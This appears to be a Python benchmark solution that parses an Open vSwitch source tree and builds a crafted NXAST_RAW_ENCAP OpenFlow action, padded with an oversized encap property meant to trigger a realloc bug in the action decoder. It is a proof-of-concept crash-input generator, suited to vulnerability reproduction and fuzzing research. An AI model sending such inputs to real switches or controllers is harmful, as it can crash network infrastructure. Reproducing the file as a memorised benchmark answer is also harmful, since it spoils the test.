import os
import re
import tarfile
import struct
from typing import Dict, Iterator, List, Optional, Tuple, Callable


def _round_up(x: int, m: int) -> int:
    return ((x + m - 1) // m) * m


def _strip_c_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
    s = re.sub(r"//.*?$", "", s, flags=re.M)
    return s


def _parse_int_literal(expr: str) -> Optional[int]:
    expr = expr.strip()
    expr = re.sub(r"\b(U|UL|ULL|L|LL)\b", "", expr)
    expr = expr.strip()
    m = re.search(r"0x[0-9a-fA-F]+|\d+", expr)
    if not m:
        return None
    token = m.group(0)
    try:
        return int(token, 16) if token.lower().startswith("0x") else int(token, 10)
    except Exception:
        return None


class _SourceFS:
    def __init__(self, src_path: str):
        self.src_path = src_path
        self._is_dir = os.path.isdir(src_path)
        self._tar = None
        self._tar_members = None
        if not self._is_dir:
            self._tar = tarfile.open(src_path, "r:*")
            self._tar_members = [m for m in self._tar.getmembers() if m.isfile()]

    def iter_paths(self) -> Iterator[str]:
        if self._is_dir:
            for root, _, files in os.walk(self.src_path):
                for fn in files:
                    yield os.path.relpath(os.path.join(root, fn), self.src_path).replace("\\", "/")
        else:
            for m in self._tar_members:
                yield m.name

    def read_bytes(self, relpath: str) -> Optional[bytes]:
        try:
            if self._is_dir:
                abspath = os.path.join(self.src_path, relpath)
                with open(abspath, "rb") as f:
                    return f.read()
            else:
                m = self._tar.getmember(relpath)
                f = self._tar.extractfile(m)
                if not f:
                    return None
                return f.read()
        except Exception:
            return None

    def read_text(self, relpath: str, max_bytes: int = 2_000_000) -> Optional[str]:
        b = self.read_bytes(relpath)
        if b is None:
            return None
        if len(b) > max_bytes:
            b = b[:max_bytes]
        try:
            return b.decode("utf-8", errors="ignore")
        except Exception:
            return None

    def find_by_basename(self, basename: str, prefer_contains: Optional[str] = None) -> Optional[str]:
        best = None
        for p in self.iter_paths():
            if p.endswith("/" + basename) or os.path.basename(p) == basename:
                if prefer_contains and prefer_contains in p:
                    return p
                if best is None:
                    best = p
        return best

    def find_paths(self, predicate: Callable[[str], bool], limit: int = 2000) -> List[str]:
        out = []
        for p in self.iter_paths():
            if predicate(p):
                out.append(p)
                if len(out) >= limit:
                    break
        return out

    def find_first_text_containing(
        self,
        token: str,
        path_predicate: Optional[Callable[[str], bool]] = None,
        max_files: int = 2000,
        max_bytes_per_file: int = 2_000_000,
    ) -> Optional[Tuple[str, str]]:
        n = 0
        for p in self.iter_paths():
            if path_predicate and not path_predicate(p):
                continue
            n += 1
            if n > max_files:
                break
            t = self.read_text(p, max_bytes=max_bytes_per_file)
            if t and token in t:
                return p, t
        return None


def _extract_c_block(text: str, start_idx: int) -> Optional[Tuple[int, int]]:
    i = text.find("{", start_idx)
    if i < 0:
        return None
    depth = 0
    in_str = False
    in_chr = False
    esc = False
    for j in range(i, len(text)):
        c = text[j]
        if in_str:
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == '"':
                in_str = False
            continue
        if in_chr:
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == "'":
                in_chr = False
            continue
        if c == '"':
            in_str = True
            continue
        if c == "'":
            in_chr = True
            continue
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return i, j + 1
    return None


def _extract_c_function(text: str, func_name: str) -> Optional[str]:
    m = re.search(r"\b" + re.escape(func_name) + r"\s*\(", text)
    if not m:
        return None
    blk = _extract_c_block(text, m.start())
    if not blk:
        return None
    return text[m.start():blk[1]]


def _parse_define(text: str, name: str) -> Optional[int]:
    m = re.search(r"^[ \t]*#[ \t]*define[ \t]+" + re.escape(name) + r"\b[ \t]+(.+?)\s*$", text, flags=re.M)
    if not m:
        return None
    return _parse_int_literal(m.group(1))


def _parse_enum_value_simple(enum_body: str, target: str) -> Optional[int]:
    entries = []
    for m in re.finditer(r"\b([A-Za-z_][A-Za-z0-9_]*)\b\s*(?:=\s*([^,}]+))?\s*(?:,|})", enum_body):
        name = m.group(1)
        expr = m.group(2)
        entries.append((name, expr))
    val = -1
    for name, expr in entries:
        if expr is not None:
            n = _parse_int_literal(expr)
            if n is None:
                return None
            val = n
        else:
            val = val + 1
        if name == target:
            return val
    return None


def _parse_enum_value(text: str, name: str) -> Optional[int]:
    m = re.search(r"\b" + re.escape(name) + r"\b\s*=\s*([^,}]+)", text)
    if m:
        v = _parse_int_literal(m.group(1))
        if v is not None:
            return v
    idx = text.find(name)
    if idx < 0:
        return None
    enum_idx = text.rfind("enum", 0, idx)
    if enum_idx < 0:
        return None
    brace_open = text.find("{", enum_idx)
    if brace_open < 0 or brace_open > idx:
        return None
    depth = 0
    for j in range(brace_open, len(text)):
        if text[j] == "{":
            depth += 1
        elif text[j] == "}":
            depth -= 1
            if depth == 0:
                body = text[brace_open + 1:j]
                return _parse_enum_value_simple(body, name)
    return None


def _resolve_constant_from_headers(fs: _SourceFS, name: str, preferred_paths: Optional[List[str]] = None) -> Optional[int]:
    if preferred_paths:
        for p in preferred_paths:
            t = fs.read_text(p)
            if not t or name not in t:
                continue
            v = _parse_define(t, name)
            if v is not None:
                return v
            v = _parse_enum_value(t, name)
            if v is not None:
                return v

    def pred(p: str) -> bool:
        if not p.endswith(".h"):
            return False
        base = os.path.basename(p)
        if base in ("config.h", "config.h.in"):
            return False
        return ("include/" in p) or ("/include/" in p) or ("openflow" in p) or ("lib/" in p)

    found = fs.find_first_text_containing(name, path_predicate=pred, max_files=4000)
    if found:
        _, t = found
        v = _parse_define(t, name)
        if v is not None:
            return v
        v = _parse_enum_value(t, name)
        if v is not None:
            return v

    # slower fallback: scan a limited subset in include/openflow first
    paths = fs.find_paths(lambda p: p.endswith(".h") and ("include/openflow/" in p or "/include/openflow/" in p), limit=3000)
    for p in paths:
        t = fs.read_text(p)
        if not t or name not in t:
            continue
        v = _parse_define(t, name)
        if v is not None:
            return v
        v = _parse_enum_value(t, name)
        if v is not None:
            return v
    return None


_BASIC_TYPE_SIZES = {
    "uint8_t": 1,
    "int8_t": 1,
    "char": 1,
    "uint16_t": 2,
    "int16_t": 2,
    "ovs_be16": 2,
    "uint32_t": 4,
    "int32_t": 4,
    "ovs_be32": 4,
    "uint64_t": 8,
    "int64_t": 8,
    "ovs_be64": 8,
    "ovs_32aligned_be64": 8,
    "ovs_be128": 16,
    "uint128_t": 16,
}


def _find_struct_block(text: str, struct_name: str) -> Optional[str]:
    # support "struct name {" and "struct name\n{"
    m = re.search(r"\bstruct\s+" + re.escape(struct_name) + r"\s*\{", text)
    if not m:
        return None
    blk = _extract_c_block(text, m.start())
    if not blk:
        return None
    body = text[text.find("{", m.start()) + 1: blk[1] - 1]
    return body


def _parse_struct_layout(
    text: str,
    struct_name: str,
    struct_sizes: Dict[str, int],
    struct_layouts: Dict[str, List[Tuple[str, str, int, int]]],
) -> Optional[Tuple[int, Dict[str, Tuple[int, int]], Optional[int]]]:
    if struct_name in struct_layouts:
        total = struct_sizes.get(struct_name)
        fields = struct_layouts[struct_name]
        offsets = {n: (off, sz) for (n, _, off, sz) in fields}
        flex_off = None
        for n, t, off, sz in fields:
            if sz == 0:
                flex_off = off
                break
        return total, offsets, flex_off

    body = _find_struct_block(text, struct_name)
    if body is None:
        return None

    cleaned = _strip_c_comments(body)
    lines = [ln.strip() for ln in cleaned.splitlines()]
    fields: List[Tuple[str, str, int, int]] = []
    offsets: Dict[str, Tuple[int, int]] = {}
    off = 0
    flex_off = None

    def type_size(type_str: str) -> Optional[int]:
        type_str = type_str.strip()
        type_str = re.sub(r"\bconst\b", "", type_str).strip()
        type_str = re.sub(r"\bvolatile\b", "", type_str).strip()
        type_str = re.sub(r"\bOVS_PACKED\b", "", type_str).strip()
        type_str = re.sub(r"\b__attribute__\s*\(\(.*?\)\)\s*", "", type_str).strip()
        type_str = re.sub(r"\bOVS_ALIGNED\(\s*\d+\s*\)", "", type_str).strip()
        type_str = re.sub(r"\b__aligned\(\s*\d+\s*\)", "", type_str).strip()

        if type_str in _BASIC_TYPE_SIZES:
            return _BASIC_TYPE_SIZES[type_str]
        m = re.match(r"struct\s+([A-Za-z_][A-Za-z0-9_]*)$", type_str)
        if m:
            sn = m.group(1)
            if sn in struct_sizes:
                return struct_sizes[sn]
            sub = _parse_struct_layout(text, sn, struct_sizes, struct_layouts)
            if sub:
                struct_sizes[sn] = sub[0]
                struct_layouts[sn] = [(n, ty, of, sz) for (n, ty, of, sz) in struct_layouts.get(sn, [])]
                return sub[0]
            return None
        # typedef struct name name; then type could be name
        if type_str in struct_sizes:
            return struct_sizes[type_str]
        sub = _parse_struct_layout(text, type_str, struct_sizes, struct_layouts)
        if sub:
            struct_sizes[type_str] = sub[0]
            return sub[0]
        return None

    decl = ""
    for ln in lines:
        if not ln:
            continue
        if ln.startswith("#"):
            continue
        decl += " " + ln
        if ";" not in ln:
            continue
        parts = decl.split(";")
        for part in parts[:-1]:
            stmt = part.strip()
            if not stmt:
                continue
            if stmt.startswith("typedef"):
                continue
            if stmt.startswith("union") or stmt.startswith("enum"):
                continue
            stmt = stmt.strip()
            # handle bitfields; ignore size after :
            stmt = re.sub(r":\s*\d+\s*$", "", stmt).strip()

            m = re.match(r"(.+?)\s+([A-Za-z_][A-Za-z0-9_]*)(\s*\[\s*([0-9]*)\s*\])?$", stmt)
            if not m:
                continue
            t = m.group(1).strip()
            n = m.group(2).strip()
            arr_raw = m.group(4)

            sz = type_size(t)
            if sz is None:
                continue

            if arr_raw is not None:
                if arr_raw == "":
                    cnt = 0
                else:
                    cnt = int(arr_raw, 10)
                if cnt == 0:
                    fields.append((n, t, off, 0))
                    offsets[n] = (off, 0)
                    if flex_off is None:
                        flex_off = off
                    # flexible array ends layout for our purposes
                    continue
                sz = sz * cnt

            fields.append((n, t, off, sz))
            offsets[n] = (off, sz)
            off += sz
        decl = parts[-1]

    total_size = off
    struct_sizes[struct_name] = total_size
    struct_layouts[struct_name] = fields
    return total_size, offsets, flex_off


def _decode_ed_prop_unknown_allowed(ofp_actions_c: str) -> bool:
    fn = _extract_c_function(ofp_actions_c, "decode_ed_prop")
    if not fn:
        return True
    fn_nc = _strip_c_comments(fn)
    # try to find default: ... until next case or end of switch/function
    m = re.search(r"\bdefault\s*:\s*", fn_nc)
    if not m:
        return True
    tail = fn_nc[m.end():]
    m2 = re.search(r"\bcase\b\s+[A-Za-z_][A-Za-z0-9_]*\s*:", tail)
    default_block = tail[: m2.start()] if m2 else tail
    # If default returns an OFPERR, treat as unknown not allowed
    if re.search(r"\breturn\s+OFPERR_[A-Za-z0-9_]+\b", default_block):
        return False
    if re.search(r"\breturn\s+OFPERR\b", default_block):
        return False
    if re.search(r"\breturn\s+ofperr\b", default_block):
        return False
    if re.search(r"\breturn\s+OFPBAC\b", default_block):
        return False
    # If default explicitly calls an "unknown" handler and returns 0, it's allowed.
    return True


def _pick_known_ed_prop_constant(ofp_actions_c: str) -> Optional[str]:
    fn = _extract_c_function(ofp_actions_c, "decode_ed_prop")
    if not fn:
        return None
    fn_nc = _strip_c_comments(fn)
    cases = re.findall(r"\bcase\b\s+([A-Za-z_][A-Za-z0-9_]*)\s*:", fn_nc)
    if not cases:
        return None
    # Prefer experimenter property if present
    for prefer in ("OFPEDP_EXPERIMENTER", "OFPEDP_EXPERIMENTER_PROP", "OFPEDP_HEADER", "OFPEDP_DATA"):
        for c in cases:
            if c == prefer or c.startswith(prefer):
                return c
    return cases[0]


def _find_fuzz_prefix_version(fs: _SourceFS) -> Tuple[int, int]:
    # Heuristic: if a fuzzer target uses Data[0] as version, prefix_len=1 and choose a safe version.
    # Otherwise, prefix_len=0.
    candidates = fs.find_paths(lambda p: p.endswith(".c") and ("fuzz" in p or "oss-fuzz" in p or "fuzzer" in p or "target" in p), limit=2000)
    for p in candidates:
        t = fs.read_text(p, max_bytes=2_000_000)
        if not t:
            continue
        if "LLVMFuzzerTestOneInput" not in t:
            continue
        if "ofpacts_decode" not in t and "ofp_actions" not in t and "ofp-actions" not in t:
            continue
        t_nc = _strip_c_comments(t)
        # common patterns:
        # version = Data[0]; ofpbuf_use_const(..., Data + 1, Size - 1);
        if re.search(r"\bData\s*\[\s*0\s*\]", t_nc) and re.search(r"\bData\s*\+\s*1\b", t_nc):
            # Try to detect a constrained mapping, otherwise choose OF1.3 (0x04) or OF1.5 (0x06)
            if "OFP15_VERSION" in t_nc:
                return 1, 0x06
            if "OFP14_VERSION" in t_nc:
                return 1, 0x05
            if "OFP13_VERSION" in t_nc:
                return 1, 0x04
            if "OFP12_VERSION" in t_nc:
                return 1, 0x03
            if "OFP11_VERSION" in t_nc:
                return 1, 0x02
            if "OFP10_VERSION" in t_nc:
                return 1, 0x01
            return 1, 0x04
    return 0, 0x04


class Solution:
    def solve(self, src_path: str) -> bytes:
        fs = _SourceFS(src_path)

        nicira_path = fs.find_by_basename("nicira-ext.h", prefer_contains="include/openflow/")
        if not nicira_path:
            nicira_path = fs.find_by_basename("nicira-ext.h")
        nicira_text = fs.read_text(nicira_path) if nicira_path else None

        if not nicira_text:
            found = fs.find_first_text_containing("NX_VENDOR_ID", path_predicate=lambda p: p.endswith(".h") and "include" in p, max_files=4000)
            nicira_text = found[1] if found else ""

        nx_vendor = _parse_define(nicira_text, "NX_VENDOR_ID")
        if nx_vendor is None:
            nx_vendor = 0x00002320

        nxast_raw_encap = _parse_define(nicira_text, "NXAST_RAW_ENCAP")
        if nxast_raw_encap is None:
            nxast_raw_encap = _parse_enum_value(nicira_text, "NXAST_RAW_ENCAP")
        if nxast_raw_encap is None:
            # common value in some trees; fallback
            nxast_raw_encap = 41

        # Find ofp-actions.c for decode_ed_prop behavior
        ofp_actions_path = fs.find_by_basename("ofp-actions.c", prefer_contains="/lib/")
        if not ofp_actions_path:
            ofp_actions_path = fs.find_by_basename("ofp-actions.c")
        ofp_actions_text = fs.read_text(ofp_actions_path) if ofp_actions_path else ""
        unknown_allowed = _decode_ed_prop_unknown_allowed(ofp_actions_text) if ofp_actions_text else True

        struct_sizes: Dict[str, int] = {}
        struct_layouts: Dict[str, List[Tuple[str, str, int, int]]] = {}
        base_len = None
        offsets = {}
        if nicira_text:
            # compute nx_action_header size first if present
            _parse_struct_layout(nicira_text, "nx_action_header", struct_sizes, struct_layouts)
            st = _parse_struct_layout(nicira_text, "nx_action_raw_encap", struct_sizes, struct_layouts)
            if st:
                _, offsets, flex_off = st
                base_len = flex_off if flex_off is not None else struct_sizes.get("nx_action_raw_encap")
        if base_len is None or base_len < 16:
            base_len = 24

        # Choose total length: prefer 72 if it yields enough property bytes to trigger realloc.
        preferred_total = 72
        prop_len = preferred_total - base_len
        if prop_len < 48 or (prop_len % 8) != 0:
            total_len = _round_up(base_len + 56, 8)
            if total_len < preferred_total:
                total_len = preferred_total
            total_len = _round_up(total_len, 8)
            prop_len = total_len - base_len
            prop_len = (prop_len // 8) * 8
            if prop_len < 48:
                total_len = _round_up(base_len + 64, 8)
                prop_len = total_len - base_len
                prop_len = (prop_len // 8) * 8
                total_len = base_len + prop_len
        else:
            total_len = preferred_total

        if prop_len < 8:
            total_len = _round_up(base_len + 8, 8)
            prop_len = total_len - base_len

        # Pick property type
        prop_type = 0x1234
        if not unknown_allowed and ofp_actions_text:
            cname = _pick_known_ed_prop_constant(ofp_actions_text)
            if cname:
                preferred_headers = []
                if nicira_path:
                    preferred_headers.append(nicira_path)
                # include/openflow headers are likely to define OFPEDP_*
                openflow_headers = fs.find_paths(lambda p: p.endswith(".h") and ("include/openflow/" in p or "/include/openflow/" in p), limit=2000)
                preferred_headers.extend(openflow_headers[:50])
                v = _resolve_constant_from_headers(fs, cname, preferred_paths=preferred_headers)
                if v is not None:
                    prop_type = v
                else:
                    prop_type = 0xFFFF

        # Build action bytes
        buf = bytearray(total_len)
        # nx_action_header: type=0xffff, len, vendor, subtype, pad[6]
        struct.pack_into("!HHI", buf, 0, 0xFFFF, total_len, nx_vendor)
        struct.pack_into("!H", buf, 8, nxast_raw_encap)

        # If there are likely length/count fields, set them heuristically.
        for name, (off, sz) in list(offsets.items()):
            lname = name.lower()
            if sz == 2:
                if ("prop" in lname or "ed" in lname) and "len" in lname:
                    try:
                        struct.pack_into("!H", buf, off, prop_len)
                    except Exception:
                        pass
                elif ("prop" in lname or "ed" in lname) and (lname.startswith("n_") or lname.startswith("n")):
                    try:
                        struct.pack_into("!H", buf, off, 1)
                    except Exception:
                        pass
            elif sz == 4:
                if ("prop" in lname or "ed" in lname) and "len" in lname:
                    try:
                        struct.pack_into("!I", buf, off, prop_len)
                    except Exception:
                        pass

        # Property at base_len
        struct.pack_into("!HH", buf, base_len, prop_type & 0xFFFF, prop_len & 0xFFFF)
        if prop_len > 4:
            buf[base_len + 4: base_len + prop_len] = b"A" * (prop_len - 4)

        prefix_len, version_byte = _find_fuzz_prefix_version(fs)
        if prefix_len == 1:
            return bytes([version_byte & 0xFF]) + bytes(buf)
        return bytes(buf)